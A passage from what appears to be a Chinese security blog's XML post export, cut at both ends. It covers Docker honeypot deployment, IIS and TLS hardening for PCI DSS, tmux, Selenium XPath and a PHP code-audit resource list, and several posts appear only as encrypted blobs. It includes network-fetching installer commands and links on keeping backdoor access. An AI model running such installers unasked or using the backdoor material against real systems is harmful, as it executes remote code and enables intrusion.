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]]></content>
      <categories>
        <category>shell</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>PCIDSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tmux创建后台会话]]></title>
    <url>%2F2020%2F08%2F26%2F128_tmux%E5%88%9B%E5%BB%BA%E5%90%8E%E5%8F%B0%E4%BC%9A%E8%AF%9D%2F</url>
    <content type="text"><![CDATA[tmux创建后台会话 QQ群：397745473 The following is a “Hello World” example illustrating the use of the send-keys command. Step 1. Create a detached session: 1user@host:~$ tmux new -d -s mySession Step 2: Execute a command in the detached session: 1user@host:$ tmux send-keys -t mySession.0 &quot;echo &apos;Hello World&apos;&quot; ENTER Step 3: Attach to the session: 1user@host:$ tmux a -t mySession tmux创建后台会话 参考: https://unix.stackexchange.com/questions/409861/is-it-possible-to-send-input-to-a-tmux-session-without-connecting-to-it QQ群：397745473]]></content>
      <categories>
        <category>shell</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[故障记录]]></title>
    <url>%2F2020%2F08%2F19%2F127_%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! 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]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker安装蜜罐]]></title>
    <url>%2F2020%2F08%2F12%2F126_docker%E5%AE%89%E8%A3%85%E8%9C%9C%E7%BD%90%2F</url>
    <content type="text"><![CDATA[docker安装蜜罐 QQ群：397745473 基于Paramiko的高交互SSH蜜罐github: https://github.com/ohmyadd/wetland docer: https://hub.docker.com/r/ohmyadd/wetland/ 参考文档: https://www.freebuf.com/sectool/145527.html 1docker pull ohmyadd/wetland 安装MHN参考文档: https://wooyun.js.org/drops/%E8%9C%9C%E7%BD%90%E7%BD%91%E7%BB%9C.html 拉取一个debian镜象123456docker search ubuntudocker pull ubuntu:18.04docker pull ubuntu:14.04docker pull ubuntu:16.04docker imagesdocker pull txt3rob/mht-docker https://hub.docker.com/r/txt3rob/mht-docker/ 12345678docker run -p 10000:10000 -p 8080:80 -p 3000:3000 -p 8089:8089 --name mhn -t -i txt3rob/mht-dockerdocker run -p 10000:10000 -p 8080:80 -p 8443:443 -p 3000:3000 -p 8091:8091 --name mhnsrv --hostname=mhnsrv01 -t -i ubuntu:14.04 /bin/bashdocker run -i -t --privileged=true -p 192.168.13.128:22:22/tcp --name cowrie1 ubuntu:16.04/bin/bashpip install tld --ignore-installed six 123456789docker run -it -d -p 1122:22 -p 1444:1444 ubuntu (old)docker run -it -d -p 1122:22 -p 3000:3000 ubuntu:16.04 (new) 把服务器的1122端口映射到docker的22上开机启动：如果创建时未指定 --restart=always ,可通过update 命令设置docker update --restart=always xxxdocker run --restart=always -it -d -p 1443:1443 -p 8834:8834 leishianquan/awvs-nessus:v2 1234567891011docker ps -adocker exec -it 容器id /bin/bashdocker exec -it f175bd270545 /bin/bash安装必要软件:apt-get update &amp;&amp; apt-get install -y lsb-release &amp;&amp; apt-get clean allapt-get install sudoapt-get -y update;apt-get -y upgrade;apt-get install curl net-tools wget vim dos2unix git dbus mongodb -yapt-get install openssh-server/etc/init.d/ssh start/etc/init.d/dbus start 123456789101112# 操作系统：ubuntu16.04# 下载apt-get install software-properties-commonpython2git clone https://github.com/threatstream/mhn.git# 安装过程有点久，需要安装很多软件包cd mhn &amp;&amp; ./install.sh# 配置服务器信息，这里的邮箱与密码就是安装完成后的Web后台密码 错误E: Unable to locate package python-pip1234567apt-get updateapt-get install software-properties-commonapt install python2python2.7 get-pip.py注释掉: apt-get install -y python-pip升级pythoncurl https://bootstrap.pypa.io/get-pip.py -o get-pip.py 报错212Note, selecting &apos;python-dev-is-python2&apos; instead of &apos;python-dev&apos;E: Unable to locate package python-pip 12345678apt-get install python-dev-is-python2apt-get install python-dev修改: ./install_hpfeeds.shapt-get -y install libffi-dev build-essential python-pip python-dev git libssl-dev supervisor改成:apt-get -y install libffi-dev build-essential python-dev-is-python2 git libssl-dev supervisor 报错3 12W: Size of file /var/lib/apt/lists/esm.ubuntu.com_ubuntu_dists_trusty-infra-security_main_binary-amd64_Packages.gz is not what the server reported 348577 348799E: GPG error: http://downloads-distro.mongodb.org dist InRelease: Clearsigned file isn&apos;t valid, got &apos;NODATA&apos; (does the network require authentication?) Docker 安装 HFISH123456789101112131415161718192021222324252627282930313233参考: https://hub.docker.com/r/imdevops/hfish参考: https://hub.docker.com/r/hfishs/hub参考: https://www.bookstack.cn/read/hfish/d805c8202babfae2.mddocker pull imdevops/hfish单点部署:docker run -d --name hfish -p 21:21 -p 22:22 -p 23:23 -p 3306:3306 -p 6379:6379 -p 8080:8080 -p 8989:8989 -p 9000:9000 -p 9001:9001 -p 11211:11211 imdevops/hfish:latestdocker ps -adocker exec -it 容器名 shdocker exec -it ccb30e30585e shdocker exec -it ccb30e30585e /bin/bash21 为 FTP 端口22 为 SSH 端口23 为 Telnet 端口3306 为 Mysql 端口6379 为 Redis 端口8080 为 暗网 端口8989 为 插件 端口9000 为 Web 端口9001 为 系统管理后台 端口11211 为 Memcache 端口以上端口根据实际需要决定是否打开，并注意端口冲突。主节点管理端部署docker run -d -it -p 8080:8080 -p 8989:8989 -p 9000:9000 -p 9001:9001 -p 6379:6379 7da65a1950f0客户端子节点部署docker run -d -it -p 7879:7879 -p 6379:6379 -p 8080:8080 -p 8989:8989 -p 9000:9000 -p 11211:11211 -e CLUSTER_IP=192.168.123.49:6379 -e NODE_NAME=clinet 7da65a1950f0 QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用docker安装trojan]]></title>
    <url>%2F2020%2F08%2F11%2F125_%E7%94%A8docker%E5%AE%89%E8%A3%85trojan%2F</url>
    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IIS 8.5 隐藏 X-Powered-By 及 X-Powered-By 信息]]></title>
    <url>%2F2020%2F07%2F28%2F122_IIS8.5%E9%9A%90%E8%97%8FX-Powered-By%E5%8F%8AX-Powered-By%E4%BF%A1%E6%81%AF%2F</url>
    <content type="text"><![CDATA[IIS 8.5 隐藏 X-Powered-By 及 X-Powered-By 信息 网上搜了很久,尝试了很多方法,觉得这种办法最靠谱,已经测试通过. 网上其中有办法是装个IIS插件,结果把IIS给搞挂了.尴尬.现在这种办法是用正则过滤,效果能符合PCI 要求 QQ群：397745473 IIS 8.5 隐藏server版本号12345678910curl -I www.vksed.comHTTP/1.1 200 OKContent-Length: 206Content-Type: text/htmlLast-Modified: Tue, 26 Dec 2017 07:15:34 GMTAccept-Ranges: bytesETag: &quot;b3754052197ed31:0&quot;Server: Microsoft-IIS/8.5X-Powered-By: ASP.NETDate: Fri, 14 Sep 2018 06:08:04 GMT 隐藏 SERVER HEADER方法: 123456789101. 安装URL重写模块 https://www.iis.net/downloads/microsoft/url-rewrite 注：请在主页操作，网站的站点会继承的全局设置。如在网站的站点设置过，则不会继承。 2. 主页 - URL重写 - 新建出站规则 -- 空白规则 - 名称： Remove Server Info 匹配范围： 服务器变量 变量名称：RESPONSE_Server 模式: .+ 操作属性 值：APACHE-SERVER 其他默认 隐藏 X-Powered-By主页 - HTTP响应标头 - 修改 X-Powered-By 值 12345678910curl -I www.vksec.comHTTP/1.1 200 OKContent-Length: 206Content-Type: text/htmlLast-Modified: Tue, 26 Dec 2017 07:15:34 GMTAccept-Ranges: bytesETag: &quot;b3754052197ed31:0&quot;Server: APACHE-SERVERX-Powered-By: APACHE-SERVERDate: Fri, 14 Sep 2018 06:08:04 GMT 参考: https://www.sundayle.com/remove-iis-server-info/ QQ群：397745473]]></content>
      <categories>
        <category>PCIDSS</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>PCIDSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WDOWS_SERVER2012限制客户端使用TLS1.2]]></title>
    <url>%2F2020%2F07%2F28%2F123_WDOWS_SERVER2012%E9%99%90%E5%88%B6%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BD%BF%E7%94%A8TLS1.2%2F</url>
    <content type="text"><![CDATA[PCIDSS 中要求不能再使用老版本的TLS, WDOWS_SERVER2012限制客户端使用TLS1.2的方法记录如下 QQ群：397745473 修改方法: 下载工具: IISCrypto.exe https://www.nartac.com/Downloads/IISCrypto/IISCrypto.exe 选 择PCI 模板, 客户端的TLS那里注意可以勾上,不然连接数据库工具之类的会出错. 参考: https://www.nartac.com/Products/IISCrypto/ QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>PCIDSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP代码审计入坑记录]]></title>
    <url>%2F2020%2F06%2F03%2F120_PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E5%9D%91%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[PHP代码审计入坑记录 包括: 环境搭建,常用工具,相关资料 QQ群：397745473 环境搭建[phpstudy] https://www.xp.cn/download.html [sublime text 2] https://www.sublimetext.com/2 插件： Package Control 1import urllib2,os,hashlib; h = '6f4c264a24d933ce70df5dedcf1dcaee' + 'ebe013ee18cced0ef93d5f746d80ef60'; pf = 'Package Control.sublime-package'; ipp = sublime.installed_packages_path(); os.makedirs( ipp ) if not os.path.exists(ipp) else None; urllib2.install_opener( urllib2.build_opener( urllib2.ProxyHandler()) ); by = urllib2.urlopen( 'http://packagecontrol.io/' + pf.replace(' ', '%20')).read(); dh = hashlib.sha256(by).hexdigest(); open( os.path.join( ipp, pf), 'wb' ).write(by) if dh == h else None; print('Error validating download (got %s instead of %s), please try manual install' % (dh, h) if dh != h else 'Please restart Sublime Text to finish installation') 从菜单 View - Show Console 或者 ctrl + ~ 快捷键，调出 console。将以下 Python 代码粘贴进去并 enter 执行 Ctags, PHPTidy, ConvertToutf8 123456&#123; &quot;cmd&quot;: [&quot;php&quot;,&quot;$file&quot;], &quot;file_regex&quot;:&quot;php$&quot;, &quot;selector&quot;:&quot;source.php&quot;&#125; 参考: https://www.moreofless.co.uk/sublime-text-php-build-system/ Build system Firefox 插件：FoxyProxy Standard,Hackbar,ModifyHeaders,User Agent Switcher,Firebug https://www.freebuf.com/sectool/35250.html Burp Suite http://scz.617.cn:8/misc/201910151519.txt vMysqlMonitoring WEB 编码转换工具 : http://www.jsons.cn/utf8/ Notepad++ 常用工具文件变化实时监控工具(代码审计/黑盒/白盒审计辅助工具)： https://github.com/TheKingOfDuck/FileMonitor MySQL实时监控工具(代码审计/黑盒/白盒审计辅助工具) ： https://github.com/TheKingOfDuck/MySQLMonitor https://github.com/virink/vMysqlMonitoring rips官网：http://rips-scanner.sourceforge.net/ 相关资料你真的会代码审计吗？ https://zhuanlan.zhihu.com/p/22417081 代码审计总结 http://blog.orleven.com/2018/02/13/code-audit-summary/ php代码审计 https://www.bilibili.com/video/av52805789/ 靶场: https://vulhub.org/ 文件包含维持后门权限: http://www.e-wolf.top/index.php/archives/85/ https://www.freebuf.com/articles/web/127806.html 安全行业Blogs:[浩翰Redamancy] https://plutoacharon.github.io/ [星际黑客] https://www.xj.hk/ [virzz] https://www.virzz.com/ [小学生] https://xxs2.cn [雨苁] https://www.ddosi.com/ [a301] https://www.zhihu.com/people/hi_301/posts [黑白网] https://www.heibai.org/ [HatBoy] https://hatboy.github.io/ [离别歌] https://www.leavesongs.com/ [黑暗旋律] https://b.nop.pw/ [nilchar] https://nilchar.com/ [taroballz] http://www.taroballz.com/ [fossbytes] https://fossbytes.com/ [TRY博客] http://www.nctry.com/ [西门吹雪个人网盘] http://pan.ximcx.cn/home [thief] https://thief.one/ [国外-patilpiyush] https://medium.com/@patilpiyush QQ群：397745473]]></content>
      <categories>
        <category>PHP代码审计</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[selenium网页xpath定位总结]]></title>
    <url>%2F2020%2F05%2F20%2F119_selenium%E5%AE%9A%E4%BD%8D%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[selenium + Python – xpath定位 xpath匹配文字真是太方便了. 平常一些不太好定位的网站用文字定位分分钟搞定. QQ群：397745473 1. xpath屬性定位xpath可以通過元素的id, name, class這些屬性定位，如下： 123driver.find_element_by_xpath(&quot;//*[@id=&apos;kw&apos;]&quot;).send_keys(&quot;by_xpath&quot;)driver.find_element_by_xpath(&quot;//*[@name=&apos;wd&apos;]&quot;).send_keys(&quot;by_xpath&quot;)driver.find_element_by_xpath(&quot;//*[@class=&apos;s_ipt&apos;]&quot;).send_keys(&quot;by_xpath&quot;) 2. xpath其他屬性定位1driver.find_element_by_xpath(&quot;//*[@autocomplete=&apos;off&apos;]&quot;).send_keys(&quot;by_xpath&quot;) 3. xpath標籤同一個屬性同名較多的時候，可以指定標籤，定位更準，如下： 1driver.find_element_by_xpath(&quot;//input[@id=&apos;kw&apos;]&quot;).send_keys(&quot;by_xpath&quot;) 4. xpath層級如果一個元素的屬性不是很明顯，可以通過父元素來找它，如果父元素的屬性也不是很明顯，就通過父元素的父元素，即爺爺元素來找，如下 1234# 通過父元素定位driver.find_element_by_xpath(&quot;//span[@id=&apos;s_kw_wrap&apos;]/input&quot;).send_keys(&quot;by_xpath&quot;)#通過爺爺元素定位driver.find_element_by_xpath(&quot;//form[@id=&apos;form&apos;]/span/input&quot;).send_keys(&quot;by_xpath&quot;) 5. xpath索引如果一個元素它的兄弟元素跟它標籤一樣，這時候無法通過層級定位，可以通過索引定位，如下： 123driver.find_element_by_xpath(&quot;//select[@id=&apos;nr&apos;]/option[1]&quot;).click()driver.find_element_by_xpath(&quot;//select[@id=&apos;nr&apos;]/option[2]&quot;).click()driver.find_element_by_xpath(&quot;//select[@id=&apos;nr&apos;]/option[3]&quot;).click() 這裡索引是從1開始的，跟python的索引不一樣。 6. xpath邏輯運算xpath支援與(and)、或(or)、非(not)，如下： 1driver.find_element_by_xpath(&quot;//*[@id=&apos;kw&apos; and @autocomplete=&apos;off&apos;]&quot;).send_keys(&quot;by_xpath&quot;) 7. xpath模糊匹配12345678# 匹配文字driver.find_element_by_xpath(&quot;//*[contains(text(), &apos;hao123&apos;)]&quot;).click()# 匹配屬性driver.find_element_by_xpath(&quot;//*[contains(@id, &apos;kw&apos;)]&quot;).click()# 匹配以什麼開頭driver.find_element_by_xpath(&quot;//*[starts-with(@id, &apos;s_kw_&apos;)]&quot;).click()# 匹配以什麼結尾driver.find_element_by_xpath(&quot;//*[ends-with(@id, &apos;kw_wrap&apos;)]&quot;).click() 更多参考: selenium-Python之定位下拉框選擇 : https://www.itread01.com/content/1547428158.html 定位下拉框，遇到一些問題:(沒有新增顯式等待會導致找不到頁面元素) https://www.itread01.com/content/1542770594.html QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[geckodriver在linux下安装]]></title>
    <url>%2F2020%2F05%2F19%2F117_geckodriver%E5%9C%A8linux%E4%B8%8B%E5%AE%89%E8%A3%85%2F</url>
